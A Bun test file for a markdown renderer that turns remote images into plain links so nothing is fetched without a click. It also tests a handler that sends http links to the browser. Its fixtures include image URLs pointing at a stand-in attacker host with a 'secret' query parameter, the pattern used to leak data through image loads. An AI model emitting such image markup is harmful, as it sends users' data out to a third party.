import { describe, expect, test } from "bun:test";
import { handleLinkClick, renderMarkdown } from "./markdown";

const PIXEL = "data:image/png;base64,iVBORw0KGgo=";

describe("renderMarkdown", () => {
  test("shows a remote image as a link, so nothing is fetched until it is clicked", () => {
    const html = renderMarkdown("![chart](https://evil.example/x.png?d=secret)");
    expect(html).not.toContain("<img");
    expect(html).toContain('<a href="https://evil.example/x.png?d=secret">chart (image from evil.example)</a>');
  });

  test("catches every spelling a webview resolves to a remote address", () => {
    const spellings = [
      "//evil.example/x.png",
      "///evil.example/x.png",
      "https:evil.example/x.png",
      "https:/evil.example/x.png",
      "HTTPS://EVIL.example/x.png",
    ];
    for (const src of spellings) {
      const html = renderMarkdown(`![](${src})`);
      expect(html).not.toContain("<img");
      expect(html).toContain('<a href="https://evil.example/x.png">Image from evil.example</a>');
    }
    expect(renderMarkdown("![](http:evil.example/x.png)")).toContain('<a href="http://evil.example/x.png">');
    expect(renderMarkdown("![x][ref]\n\n[ref]: https://evil.example/x.png")).not.toContain("<img");
  });

  test("leaves an image that stays on this machine alone", () => {
    expect(renderMarkdown("![](./shot.png)")).toContain('<img src="./shot.png"');
    expect(renderMarkdown("![](asset://localhost/shot.png)")).toContain('<img src="asset://localhost/shot.png"');
  });

  test("escapes the alt text of a remote image", () => {
    expect(renderMarkdown("![<b>](https://evil.example/x.png)")).toContain("&lt;b&gt; (image from evil.example)");
  });

  test("leaves a bare remote image URL as a plain link", () => {
    const html = renderMarkdown("see https://example.com/a.png");
    expect(html).not.toContain("<img");
    expect(html).toContain('<a href="https://example.com/a.png">https://example.com/a.png</a>');
  });

  test("keeps an inline data image as an image, bare or in image syntax", () => {
    expect(renderMarkdown(`![cat](${PIXEL})`)).toContain(`<img src="${PIXEL}" alt="cat">`);
    expect(renderMarkdown(PIXEL)).toContain(`<img src="${PIXEL}" alt="">`);
  });
});

const click = (href: string) => {
  let prevented = false;
  let opened: string | undefined;
  const event = {
    target: { closest: () => ({ getAttribute: () => href }) },
    preventDefault: () => {
      prevented = true;
    },
  };
  handleLinkClick(event, (url) => {
    opened = url;
  });
  return { prevented, opened };
};

describe("handleLinkClick", () => {
  test("routes http(s) links to the browser, blocking webview navigation", () => {
    expect(click("https://example.com/docs")).toEqual({ prevented: true, opened: "https://example.com/docs" });
    expect(click("http://localhost:8080/x?y=1")).toEqual({ prevented: true, opened: "http://localhost:8080/x?y=1" });
  });

  test("leaves non-http targets (mailto, anchors, missing) to default behavior", () => {
    expect(click("mailto:a@b.c")).toEqual({ prevented: false, opened: undefined });
    expect(click("#anchor")).toEqual({ prevented: false, opened: undefined });
    expect(click("")).toEqual({ prevented: false, opened: undefined });
  });
});
